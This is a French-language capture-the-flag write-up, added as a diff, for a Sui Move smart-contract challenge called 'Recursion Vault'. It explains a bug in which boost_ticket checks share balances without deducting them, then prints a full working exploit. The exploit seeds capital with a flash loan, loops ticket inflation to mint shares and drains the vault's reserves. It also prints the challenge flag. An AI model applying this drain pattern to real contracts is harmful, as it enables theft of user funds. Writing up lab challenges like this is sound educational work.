@@ -1,0 +1,139 @@
+---
+title: Write-up BITCTF 2026 - Blockchain - Recursion Vault
+date: '2026-02-21'
+description: 'Catégorie : Blockchain / Smart Contracts (Sui Move)'
+tags:
+  - ctf
+  - blockchain
+  - sui-move
+  - smart-contract
+  - writeup
+---
+**Catégorie :** Blockchain / Smart Contracts (Sui Move)
+
+**Flag :** `BITSCTF{db401be2dd69db00ed49ba11fef769d2}`
+
+---
+## Aperçu
+"Here Comes The Money" est un défi de type _Smart Contract_ basé sur Sui Move, mettant en scène un "Recursion Vault Protocol v2.0". L'objectif ultime est impitoyable : siphonner au moins **80%** des **10 000 000 000 SUI** de réserves du coffre-fort.
+Pour triompher, nous devons forger une fonction `solve` au sein d'un fichier `exploit.move`. Le serveur compilera notre code et le lancera contre le contrat cible. Si notre exploit parvient à vider le coffre (déclenchant ainsi la condition `check_exploit`), le serveur capitule et nous livre le flag.
+
+## Concepts Clés de la Blockchain Sui
+Avant de plonger dans l'exploit, un rappel des concepts fondamentaux de Sui Move s'impose pour saisir l'élégance de l'attaque :
+- **Objets & Capacités (_Abilities_) :** Dans l'écosystème Sui, tout est objet. Ces objets possèdent des capacités intrinsèques telles que `key` (stockage global), `store` (imbrication dans d'autres objets), `copy` (duplication), et `drop` (destruction sans déballage explicite).
+- **Objets Partagés vs Possédés :** Le `Vault` de ce challenge est un objet partagé                             (`transfer:share_object(vault)`), offrant à quiconque la possibilité d'interagir avec lui. À l'inverse, un `UserAccount` est strictement possédé par une adresse spécifique.
+- **TxContext :** Le contexte de transaction (`&mut TxContext`) est le fil d'Ariane passé aux fonctions d'entrée. Il révèle l'identité de l'expéditeur et génère des identifiants uniques (`UID`) pour les nouveaux objets.
+- **La "Hot Potato" :** La structure `FlashLoanReceipt` est dépourvue des capacités `key`, `copy`, ou `drop` dans une implémentation standard de prêts éclairs. Une véritable "patate chaude" doit être obligatoirement consommée par une fonction spécifique (comme `repay_loan`) avant la fin de la transaction, garantissant le remboursement absolu du prêt. (Ironiquement, dans ce challenge, elle possède la capacité `drop`, une vulnérabilité en soi, bien que ce ne soit pas l'arme principale de notre braquage).
+## Analyse de la Vuln
+Explorons le module `challenge::vault`. Le contrat permet aux utilisateurs de déposer des SUI contre des parts (`shares`), d'invoquer `create_ticket` pour incinérer ces parts en échange d'un `WithdrawTicket`, et d'utiliser `finalize_withdraw` pour reconvertir ce ticket en SUI. Le protocole offre également des fonctions utilitaires : `split_ticket`, `merge_tickets`, et `boost_ticket`.
+
+> **ℹ️ BUG: Le bug critique : `boost_ticket`**
+>
+> 
+> Le cœur de cet exploit réside au sein de la fonction `boost_ticket` :
+
+Extrait de code
+```rust
+public fun boost_ticket(
+    vault: &Vault,
+    account: &mut UserAccount,
+    ticket: WithdrawTicket,
+    boost_shares: u64,
+    ctx: &mut TxContext
+): WithdrawTicket {
+    assert!(!vault.is_paused, E_VAULT_LOCKED);
+    assert!(tx_context::sender(ctx) == ticket.owner, E_NOT_OWNER);
+    assert!(tx_context::sender(ctx) == account.owner, E_NOT_OWNER);
+
+    // VULNERABILITÉ : Vérifie la possession des parts, mais NE LES DÉDUIT JAMAIS !
+    assert!(boost_shares <= account.shares, E_INSUFFICIENT_BALANCE);
+    let WithdrawTicket { amount, owner, vault_id, timestamp_ms, merge_count } = ticket;
+    
+    WithdrawTicket {
+        amount: amount + boost_shares, // Inflation artificielle !
+        owner,
+        vault_id,
+        timestamp_ms,
+        merge_count
+    }
+}
+```
+
+La fonction s'assure que `boost_shares <= account.shares`. Cependant, **elle omet de soustraire** `boost_shares` de `account.shares`. Cette négligence mathématique nous offre le pouvoir d'inflate arbitrairement le montant d'un `WithdrawTicket` en utilisant notre solde existant, sans jamais dépenser la moindre part.
+
+> **⚠️ WARNING: Le deuxième hic : l'underflow dans `cancel_ticket`**
+>
+> 
+> La tentation première serait de boucler indéfiniment sur `boost_ticket` et `cancel_ticket` pour imprimer des parts à l'infini. Cependant, `cancel_ticket` exécute la logique suivante :
+> 
+> Extrait de code
+> ```rust
+> account.shares = account.shares + amount;
+> account.active_ticket_value = account.active_ticket_value - amount;
+> ```
+> 
+> Puisque `boost_ticket` gonfle le montant (`amount`) sans mettre à jour `active_ticket_value` sur le `UserAccount`, l'appel à `cancel_ticket` sur un ticket muté provoquerait un _underflow_ arithmétique (0 - inflated_amount), anéantissant la transaction sur-le-champ.
+
+## Stratégie de l'exploit
+Pour contourner le crash arithmétique de `cancel_ticket`, nous devons escorter notre ticket corrompu jusqu'au bout du processus de retrait.
+
+1. **Capital initial :** Nous détournons la fonction `flash_loan` pour emprunter **100 SUI**, amorçant ainsi notre machination.
+2. **Le dépôt :** Ces 100 SUI sont injectés dans notre `UserAccount` via `deposit`, nous octroyant nos 100 premières parts.
+3. **La boucle d'inflation :**
+    - `create_ticket` pour **1 share**. Notre `account.shares` tombe à **99**. La valeur du ticket est de **1**.
+    - `boost_ticket` utilisant les **99 shares** restants. Le montant du ticket bondit à        $1 + 99 = 100$. Fait crucial : notre `account.shares` reste intact à **99**.
+    - `finalize_withdraw` pour liquider le ticket dopé (montant : **100**). Le contrat nous verse des SUI basés sur ce montant illusoire et le ratio actuel du coffre.
+    - `deposit` pour réinjecter immédiatement les SUI volés. Ayant retiré plus de valeur que nous n'en avons légitimement brûlé, notre nouveau solde de parts explosera (doublant approximativement nos parts à chaque cycle).
+    - Nous répétons ce process entre 25 à 30 fois. SUI opérant sur une arithmétique de type `u64`, cette croissance exponentielle propulse notre solde au-delà du seuil critique des **10 000 000 000**.
+4. **Le drainage final :** Dès que notre `UserAccount` franchit le cap des **9 500 000 000** de parts (la cible étant fixée à 8 milliards), nous forgeons un ultime ticket (`create_ticket`) de 9 500 000 000 et l'exécutons (`finalize_withdraw`) pour saigner ce coffre.
+5. **Remboursement final :** Nous honorons notre dette en remboursant les 100 SUI du flash loan initial (assortis d'un maigre frais de 1 SUI). Les milliards de SUI restants sont transférés vers notre adresse.
+## Le code de l'exploit
+Voici le module `solution::exploit` tel qu'il doit être prêt à être injecté depuis un terminal :
+
+Extrait de code
+```rust
+module solution::exploit {
+    use challenge::vault::{Self, Vault};
+    use sui::tx_context::{Self, TxContext};
+    use sui::clock::{Clock};
+    use sui::transfer;
+    use sui::coin;
+
+    public fun solve(v: &mut Vault, clock: &Clock, ctx: &mut TxContext) {
+        // 1. Préparation du compte
+        let mut account = vault::create_account(ctx);
+
+        // 2. Flash loan pour le capital d'amorçage
+        let (c_dep, receipt) = vault::flash_loan(v, 100, ctx);
+        vault::deposit(v, &mut account, c_dep, ctx);
+
+        // 3. La Boucle d'Inflation
+        let mut current_shares = vault::user_shares(&account);
+        while (current_shares < 10_000_000_000) {
+            // Sacrifier 1 share pour forger un ticket
+            let t = vault::create_ticket(v, &mut account, 1, clock, ctx);
+            // Doper le ticket avec le reste (les parts NE SONT PAS déduites !)
+            let t2 = vault::boost_ticket(v, &mut account, t, current_shares - 1, ctx);
+            // Retirer le ticket artificiellement gonflé
+            let out_coin = vault::finalize_withdraw(v, &mut account, t2, clock, ctx);
+            // Redéposer pour matérialiser l'illusion en nouvelles parts réelles
+            vault::deposit(v, &mut account, out_coin, ctx);
+
+            current_shares = vault::user_shares(&account);
+        };
+
+        // 4. Le Coup de Grâce (The Drain)
+        let final_target = 9_500_000_000;
+        let t = vault::create_ticket(v, &mut account, final_target, clock, ctx);
+        let mut out_coin = vault::finalize_withdraw(v, &mut account, t, clock, ctx);
+
+        // 5. Remboursement du flash loan
+        let repay_coin = coin::split(&mut out_coin, 101, ctx);
+        vault::repay_loan(v, repay_coin, receipt);
+
+        // Conserver le butin et effacer les traces
+        transfer::public_transfer(out_coin, tx_context::sender(ctx));
+        vault::destroy_account(account);
+    }
+}
+```
